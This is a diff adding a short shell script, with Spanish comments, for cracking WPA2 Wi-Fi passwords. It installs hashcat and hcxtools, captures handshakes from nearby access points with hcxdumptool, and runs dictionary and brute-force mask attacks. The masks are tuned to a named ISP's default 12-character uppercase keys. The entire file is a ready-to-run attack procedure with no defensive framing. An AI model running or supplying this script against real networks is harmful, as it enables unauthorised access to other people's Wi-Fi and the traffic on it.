@@ -1,0 +1,30 @@
+#script para crackear wp2 passwords
+#TELECENTRO: 12 Caracteres en Mayuscula por default
+
+#Instalando Herramientas
+apt update; apt install -y hashcat hcxtools hcxdumptool
+
+#Parando los servicios de redes
+sudo systemctl stop NetworkManager.service
+sudo systemctl stop wpa_supplicant.service
+
+#Capturando las redes wifi
+sudo hcxdumptool -i wlx1cbfce976b1d -o dumpfile.pcapng --active_beacon --enable_status=15 
+
+#capturando los "bssid" de los APs
+sudo hcxdumptool --do_rcascan -i wlx1cbfce976b1d | tee -a aps.tx
+
+#Preparando el archivo para hashcat 
+hcxpcapngtool -o hash.hc22000 -E essidlist dumpfile.pcapng
+
+#Levantando los servicio de redes
+sudo systemctl start wpa_supplicant.service
+sudo systemctl start NetworkManager.service
+
+#hashcat: ataque con diccionario
+hashcat -m 22000 hash.hc22000 wordlist.txt
+
+#hashcat: ataque fuerza bruta 
+hashcat -m 22000 hash.hc22000 -a 3 -1 ?u?d ?1?1?1?1?1?1?1?1 #8 caracteres random entre mayuscula y números
+hashcat -m 22000 hash.hc22000 -a 3 ?u?u?u?u?u?u?u?u #8 caracteres en mayuscula
+hashcat -m 22000 hash.hc22000 -a 3 --increment --increment-min 8 --increment-max 12 ?d?d?d?d?d?d?d?d?d?d?d?d?d #8 caracteres minimo 12 maximo todos numeros
